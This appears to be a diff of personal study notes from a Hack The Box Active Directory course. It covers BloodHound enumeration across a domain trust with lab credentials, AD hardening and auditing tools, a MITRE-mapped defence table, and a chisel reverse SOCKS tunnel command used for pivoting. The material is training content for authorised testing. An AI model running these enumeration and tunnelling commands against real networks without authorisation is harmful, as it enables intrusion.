+		m1l0js@htb[/htb]$ cat /etc/resolv.conf 
+			#nameserver 1.1.1.1
+			#nameserver 8.8.8.8
+			domain INLANEFREIGHT.LOCAL
+			nameserver 172.16.5.5
+
+	> Once this is in place, we can run the tool against the target domain as follows:
+	> Running bloodhound-python Against INLANEFREIGHT.LOCAL
+
+		m1l0js@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+
+	> We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.
+	> Compressing the File with zip -r
+		m1l0js@htb[/htb]$ zip -r ilfreight_bh.zip *.json
+
+	> We will repeat the same process, this time filling in the details for the FREIGHTLOGISTICS.LOCAL domain.
+	> Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+		m1l0js@htb[/htb]$ cat /etc/resolv.conf 
+			#nameserver 1.1.1.1
+			#nameserver 8.8.8.8
+			domain FREIGHTLOGISTICS.LOCAL
+			nameserver 172.16.5.238
+
+	> The bloodhound-python command will look similar to the previous one:
+	> Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
+		m1l0js@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+
+After uploading the second set of data (either each JSON file or as one zip file), we can click on Users with Foreign Domain Group Membership under the Analysis tab and select the source domain as INLANEFREIGHT.LOCAL. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.
+
+-=-=
+[+] Hardening Active Directory
+
+	> Let's take some time to look at a few hardening measures that can be put in place to stop common TTPs like those we utilized in this module from being successful or providing any helpful information. Our goal as penetration testers is to help provide a better operational picture of our customers' network to their defenders and help improve their security posture. So we should understand some of the common defense tactics that can be implemented and how they would affect the networks we are assessing. These basic hardening steps will do much more for an organization (regardless of size) than purchasing the next big EDR or SIEM tool. Those extra defensive measures and equipment only help if you have a baseline security posture with features like logging enabled and proper documentation and tracking of the hosts within the network.
+
+* Step One: Document and Audit
+	> Proper AD hardening can keep attackers contained and prevent lateral movement, privilege escalation, and access to sensitive data and resources. One of the essential steps in AD hardening is understanding everything present in your AD environment. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. We care about:
+	> Things To Document and Track
+    		- Naming conventions of OUs, computers, users, groups
+    		- DNS, network, and DHCP configurations
+    		- An intimate understanding of all GPOs and the objects that they are applied to
+    		- Assignment of FSMO roles
+    		- Full and current application inventory
+    		- A list of all enterprise hosts and their location
+    		- Any trust relationships we have with other domains or outside entities
+    		- Users who have elevated permissions
+
+* People, Processes, and Technology
+	> AD hardening can be broken out into the categories People, Process, and Technology. These hardening measures will encompass the hardware, software, and human aspects of any network.
+
+* People
+	> In even the most hardened environment, users remain the weakest link. Enforcing security best practices for standard users and administrators will prevent "easy wins" for pentesters and malicious attackers. We should also strive to keep our users educated and aware of threats to themselves. The measures below are a great way to start securing the Human element of an AD environment.
+    	> The organization should have a strong password policy, with a password filter that disallows the use of common words (i.e., welcome, password, names of months/days/seasons, and the company name). If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords.
+    	> Rotate passwords periodically for all service accounts.
+    	> Disallow local administrator access on user workstations unless a specific business need exists.
+    	> Disable the default RID-500 local admin account and create a new admin account for administration subject to LAPS password rotation.
+    	> Implement split tiers of administration for administrative users. Too often, during an assessment, you will gain access to Domain Administrator credentials on a computer that an administrator uses for all work activities.
+    	> Clean up privileged groups. Does the organization need 50+ Domain/Enterprise Admins? Restrict group membership in highly privileged groups to only those users who require this access to perform their day-to-day system administrator duties.
+    	> Where appropriate, place accounts in the Protected Users group.
+    	> Disable Kerberos delegation for administrative accounts (the Protected Users group may not do this)
+
+* Protected Users Group
+
+	> The Protected Users group first appeared with Window Server 2012 R2. This group can be used to restrict what members of this privileged group can do in a domain. Adding users to Protected Users prevents user credentials from being abused if left in memory on a host.
+	> Viewing the Protected Users Group with Get-ADGroup
+		PS C:\Users\htb-student> Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
+
+	> The group provides the following Domain Controller and device protections:
+
+    		- Group members can not be delegated with constrained or unconstrained delegation.
+    		- CredSSP will not cache plaintext credentials in memory even if Allow delegating default credentials is set within Group Policy.
+    		- Windows Digest will not cache the user's plaintext password, even if Windows Digest is enabled.
+    		- Members cannot authenticate using NTLM authentication or use DES or RC4 keys.
+    		- After acquiring a TGT, the user's long-term keys or plaintext credentials are not cached.
+    		- Members cannot renew a TGT longer than the original 4-hour TTL.
+
+	> Note: The Protected Users group can cause unforeseen issues with authentication, which can easily result in account lockouts. An organization should never place all privileged users in this group without staged testing.
+	> Along with ensuring your users cannot cause harm to themselves, we should consider our policies and procedures for domain access and control.
+
+* Processes
+	> Maintaining and enforcing policies and procedures that can significantly impact an organization's overall security posture is necessary. Without defined policies, it is impossible to hold an organization's employees accountable, and difficult to respond to an incident without defined and practiced procedures such as a disaster recovery plan. The items below can help to define processes, policies, and procedures.
+
+    	> Proper policies and procedures for AD asset management.
+    	>     AD host audit, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost.
+    	> Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms.
+    	> Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)
+    	> AD cleanup policies
+        	- Are accounts for former employees removed or just disabled?
+        	- What is the process for removing stale records from AD?
+        	- Processes for decommissioning legacy operating systems/services (i.e., proper uninstallation of Exchange when migrating to 0365).
+        	- Schedule for User, groups, and hosts audit.
+
+* Technology
+	> Periodically review AD for legacy misconfigurations and new and emerging threats. As changes are made to AD, ensure that common misconfigurations are not introduced. Pay attention to any vulnerabilities introduced by AD and tools or applications utilized in the environment.
+
+    		- Run tools such as BloodHound, PingCastle, and Grouper periodically to identify AD misconfigurations.
+    		- Ensure that administrators are not storing passwords in the AD account description field.
+    		- Review SYSVOL for scripts containing passwords and other sensitive data.
+    		- Avoid the use of "normal" service accounts, utilizing Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting.
+    		- Disable Unconstrained Delegation wherever possible.
+    		- Prevent direct access to Domain Controllers through the use of hardened jump hosts.
+    		- Consider setting the ms-DS-MachineAccountQuota attribute to 0, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)
+    		- Disable the print spooler service wherever possible to prevent several attacks
+    		- Disable NTLM authentication for Domain Controllers if possible
+    		- Use Extended Protection for Authentication along with enabling Require SSL only to allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
+    		- Enable SMB signing and LDAP signing
+    		- Take steps to prevent enumeration with tools like BloodHound
+    		- Ideally, perform quarterly penetration tests/AD security assessments, but if budget constraints exist, these should be performed annually at the very least.
+    		- Test backups for validity and review/practice disaster recovery plans.
+    		- Enable the restriction of anonymous access and prevent null session enumeration by setting the RestrictNullSessAccess registry key to 1 to restrict null session access to unauthenticated users.
+
+* Protections By Section
+
+As a different look at this, we have broken out the significant actions by section and correlated controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the Enterprise ATT&CK Matrix found here. Any tag marked as TA corresponds to an overarching tactic, while a tag marked as T### is a technique found in the matrix under tactics.
+TTP 				MITRE Tag 	Description
+External Reconnaissance 	T1589 		This portion of an attack is extremely hard to detect and defend against. An attacker does not have to interact with your enterprise environment directly, so it's impossible to tell when it is happening. What can be done is to monitor and control the data you release publically to the world. Job postings, documents (and the metadata left attached), and other open information sources like BGP and DNS records all reveal something about your enterprise. Taking care to scrub documents before release can ensure an attacker cannot glean user naming context from them as an example. The same can be said for not providing detailed information about tools and equipment utilized in your networks via job postings.
+
+Internal Reconnaissance 	T1595 		For reconnaissance of our internal networks, we have more options. This is often considered an active phase and, as such, will generate network traffic which we can monitor and place defenses based on what we see. Monitoring network traffic for any suspicious bursts of packets of a large volume from any one source or several sources can be indicative of scanning. A properly configured Firewall or Network Intrusion Detection System (NIDS) will spot these trends quickly and alert on the traffic. Depending on the tool or appliance, it may even be able to add a rule blocking traffic from said hosts proactively. The utilization of network monitoring coupled with a SIEM can be crucial to spotting reconnaissance. Properly tuning the Windows Firewall settings or your EDR of choice to not respond to ICMP traffic, among other types of traffic, can help deny an attacker any information they may glean from the results.
+
+Poisoning 			T1557 	Utilizing security options like SMB message signing and encrypting traffic with a strong encryption mechanism will go a long way to stopping poisoning & man-in-the-middle attacks. SMB signing utilizes hashed authentication codes and verifies the identity of the sender and recipient of the packet. These actions will break relay attacks since the attacker is just spoofing traffic.
+
+Password Spraying 		T1110/003 	This action is perhaps the easiest to defend against and detect. Simple logging and monitoring can tip you off to password spraying attacks in your network. Watching your logs for multiple attempts to login by watching Event IDs 4624 and 4648 for strings of invalid attempts can tip you off to password spraying or brute force attempts to access the host. Having strong password policies, an account lockout policy set, and utilizing two-factor or multi-factor authentication can all help prevent the success of a password spray attack. For a deeper look at the recommended policy settings, check out this article and the NIST documentation.
+
+Credentialed Enumeration 	TA0006 		There is no real defense you can put in place to stop this method of attack. Once an attacker has valid credentials, they effectively can perform any action that the user is allowed to do. A vigilant defender can detect and put a stop to this, however. Monitoring for unusual activity such as issuing commands from the CLI when a user should not have a need to utilize it. Multiple RDP requests sent from host to host within the network or movement of files from various hosts can all help tip a defender off. If an attacker manages to acquire administrative privileges, this can become much more difficult, but there are network heuristics tools that can be put in place to analyze the network constantly for anomalous activity. Network segmentation can help a lot here.
+
+LOTL 				N/A 		It can be hard to spot an attacker while they are utilizing the resources built-in to host operating systems. This is where having a baseline of network traffic and user behavior comes in handy. If your defenders understand what the day-to-day regular network activity looks like, you have a chance to spot the abnormal. Watching for command shells and utilizing a properly configured Applocker policy can help prevent the use of applications and tools users should not have access to or need.
+
+Kerberoasting 			T1558/003 	Kerberoasting as an attack technique is widely documented, and there are plenty of ways to spot it and defend against it. The number one way to protect against Kerberoasting is to utilize a stronger encryption scheme than RC4 for Kerberos authentication mechanisms. Enforcing strong password policies can help prevent Kerberoasting attacks from being successful. Utilizing Group Managed service accounts is probably the best defense as this makes Kerberoasting no longer possible. Periodically auditing your users' account permissions for excessive group membership can be an effective way to spot issues.
+
+
+-=-=
+[+] Additional AD Auditing Techniques
+
+	> Along with discussing the hardening of an AD domain, we wanted to discuss AD auditing. We want to provide our customers with as much information as possible to help solve the potential issues we find. Doing so will give them more data to prove they have a problem and help acquire backing and funding to tackle those fixes. The tools in this section can be utilized to provide different visualizations and data output for this purpose.
+
+* Creating an AD Snapshot with Active Directory Explorer
+	> AD Explorer is part of the Sysinternal Suite and is described as:
+	> "An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to navigate an AD database easily, define favorite locations, view object properties, and attributes without opening dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute."
+	> AD Explorer can also be used to save snapshots of an AD database for offline viewing and comparison. We can take a snapshot of AD at a point in time and explore it later, during the reporting phase, as you would explore any other database. It can also be used to perform a before and after comparison of AD to uncover changes in objects, attributes, and security permissions.
+	> When we first load the tool, we are prompted for login credentials or to load a previous snapshot. We can log in with any valid domain user.
+	> Once logged in, we can freely browse AD and view information about all objects.
+	> To take a snapshot of AD, go to File --> Create Snapshot and enter a name for the snapshot. Once it is complete, we can move it offline for further analysis.
+
+* PingCastle
+
+	> PingCastle(https://www.pingcastle.com/documentation/) is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain's security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the Capability Maturity Model Integration (CMMI). For a quick look at the help context provided, you can issue the --help switch in cmd-prompt.
+	> Running PingCastle
+	> To run PingCastle, we can call the executable by typing PingCastle.exe into our CMD or PowerShell window or by clicking on the executable, and it will drop us into interactive mode, presenting us with a menu of options inside the Terminal User Interface (TUI).
+	> This is the main functionnality of PingCastle. In a matter of minutes, it produces a report which will give you an overview of your Active Directory security. This report can be generated on other domains by using the existing trust links.
+	> The default option is the healthcheck run, which will establish a baseline overview of the domain, and provide us with pertinent information dealing with misconfigurations and vulnerabilities. Even better, PingCastle can report recent vulnerability susceptibility, our shares, trusts, the delegation of permissions, and much more about our user and computer states. Under the Scanner option, we can find most of these checks.
+	> Throughout the report, there are sections such as domain, user, group, and trust information and a specific table calling out "anomalies" or issues that may require immediate attention. We will also be presented with the domain's overall risk score.
+	> Aside from being helpful in performing very thorough domain enumeration when combined with other tools, PingCastle can be helpful to give clients a quick analysis of their domain security posture, or can be used by internal teams to self-assess and find areas of concern or opportunities for further hardening. Take some time to explore the reports and maps PingCastle can generate on the Inlanefreight domain.
+
+* Group Policy
+	> With group policy being a large portion of how AD user and computer management is done, it's only logical that we would want to audit their settings and highlight any potential holes. Group3r is an excellent tool for this.
+
+* Group3r
+	> Group3r(https://github.com/Group3r/Group3r) is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using runas /netonly).
+	> Group3r Basic Usage
+	> C:\htb> group3r.exe -f <filepath-name.log> 
+	> When running Group3r, we must specify the -s or the -f flag. These will specify whether to send results to stdout (-s), or to the file we want to send the results to (-f). For more options and usage information, utilize the -h flag, or check out the usage info at the link above.
+	> When reading the output from Group3r, each indentation is a different level, so no indent will be the GPO, one indent will be policy settings, and another will be findings in those settings. Below we will take a look at the output shown from a finding. => (https://academy.hackthebox.com/storage/modules/143/grouper-finding.png)
+	> In the image above, you will see an example of a finding from Group3r. It will present it as a linked box to the policy setting, define the interesting portion and give us a reason for the finding. It is worth the effort to run Group3r if you have the opportunity. It will often find interesting paths or objects that other tools will overlook.
+
+* ADRecon
+
+	> Finally, there are several other tools out there that are useful for gathering a large amount of data from AD at once. In an assessment where stealth is not required, it is also worth running a tool like ADRecon(https://github.com/adrecon/ADRecon) and analyzing the results, just in case all of our enumeration missed something minor that may be useful to us or worth pointing out to our client.
+	> Running ADRecon
+		PS C:\htb> .\ADRecon.ps1
+
+	> Once done, ADRecon will drop a report for us in a new folder under the directory we executed from. We can see an example of the results in the terminal below. You will get a report in HTML format and a folder with CSV results. When generating the report, it should be noted that the program Excel needs to be installed, or the script will not automatically generate the report in that manner; it will just leave you with the .csv files. If you want output for Group Policy, you need to ensure the host you run from has the GroupPolicy PowerShell module installed. We can go back later and generate the Excel report from another host using the -GenExcel switch and feeding in the report folder.
+
+
+
+[+] Beyond this Module
+
+Real World
+
+As a Penetration Tester, one could expect the tasks provided in this module to a part of our day-to-day duties. Having a deep understanding of AD and what we can glean from it (access and enumeration-wise) is essential to fulfill the duties of the role. Our actions may often influence the actions of our teammates and senior testers if we are working on an assessment as a team. Those actions could include:
+
+    Taking advantage of cross-domain trusts to infiltrate other domains
+    Persistence methods
+    Command and Control within the domain for assessments that have longer windows,
+
+With the modern enterprise moving toward hybrid and cloud environments, understanding the foundations within AD and how to abuse them will be extremely helpful when attempting to pivot to these new types of networks. If any of the concepts, terminology, or actions discussed in this module were a bit challenging or confusing, consider going back and checking out the Introduction To Active Directory module. It contains a deep dive into all things AD and helps lay a foundation of knowledge needed to understand Active Directory.
+What's Next?
+
+Check out the Active Directory BloodHound module to better understand how BloodHound works. Also, check out the Active Directory LDAP and Active Directory PowerView modules. The Cracking Passwords with Hashcat module can also help improve our understanding of the actions we took in the Kerberoasting and Password Spraying sections.
+More AD Learning Opportunities
+
+The Hack The Box main platform has many targets for learning and practicing AD enumeration and attacks. The AD Track on the main HTB platform is an excellent resource for practice. Tracks are curated lists of machines and challenges for users to work through and master a particular topic. The AD Track contains boxes of varying difficulties with various attack vectors. Even if you cannot solve these boxes on your own, it is still worth working with them with a walkthrough or video or just watching the video on the box by Ippsec. The more you expose yourself to these topics, the more comfortable and second nature enumeration and many attacks will become. The boxes below are great to practice the skills learned in this module.
+Boxes To Pwn
+
+    Forest
+    Active
+    Reel
+    Mantis
+    Blackfield
+    Monteverde
+
+Great Videos to Check Out
+
+Six Degrees of Domain Admin from DEFCON 24 is a great watch for an introduction to BloodHound. ==> (https://youtu.be/wP8ZCczC1OU)
+Designing AD DACL Backdoors by Will Schroeder and Andy Robbins is a gem if you haven't seen it. => (https://youtu.be/_nGpZ1ydzS8)
+Kicking The Guard Dog of Hades is one of the original releases for Kerberoasting and is a great watch. => (https://www.youtube.com/watch?v=PUyhlN-E5MU)
+In Kerberoasting 101, Tim Medin does an excellent job dissecting the Kerberoasting attack and how to perform them. => (https://youtu.be/Jaa2LmZaNeU)
+
+There are so many more, but building a list here would take a whole other section. The videos above are a great start to advancing your AD knowledge.
+Writers and Blogs To Follow
+
+Between the HTB Discord, Forums, and blogs, there are plenty of outstanding write-ups to help advance your skills along the way. One to pay attention to would be 0xdf's walkthroughs. These are also a great resource to understand how an Active Directory attack path may look in the real world. 0xdf writes about much more, and his blog is an excellent resource. The list below contains links to other authors and blogs we feel do a great job discussing AD security topics and much more.
+
+SpecterOps has an interesting blog where they talk about AD, BloodHound, Command and Control, and so much more.
+Harmj0y writes quite a bit about AD, among other things as well. He is someone you should be following if you are looking to work in this industry.
+AD Security Blog by Sean Metcalf is a treasure box full of awesome content, all AD and security related. It is a must-read if you are focused on Active Directory.
+Shenaniganslabs is a great group of security researchers discussing many different topics in the security realm. These can include new vulnerabilities to Threat Actor TTPs.
+Dirk-jan Mollema also has a great blog documenting his adventures with AD security, Azure, protocols, vulnerabilities, Python, etc.
+The DFIR Report is maintained by a talented team of Blue Teamers/Infosec Content creators that share their findings from recent intrusion incidents in incredible detail. Many of their posts showcase AD attacks and the artifacts that attackers leave behind.
+
+
+
+
 
 
 
@@ -18467,6 +19736,10 @@ Search Centric
     > Finally, we need to transfer Julio's ccache file from LINUX01 and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.
     > Setting the KRB5CCNAME Environment Variable
         m1l0js@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
+
+	> Another example ==> 
+		AM: sudo ./chisel server --reverse -v -p 1234 --socks5
+		VM: .\chisel.exe client -v 10.10.15.45:1234 R:socks
 
     > Impacket
         + To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
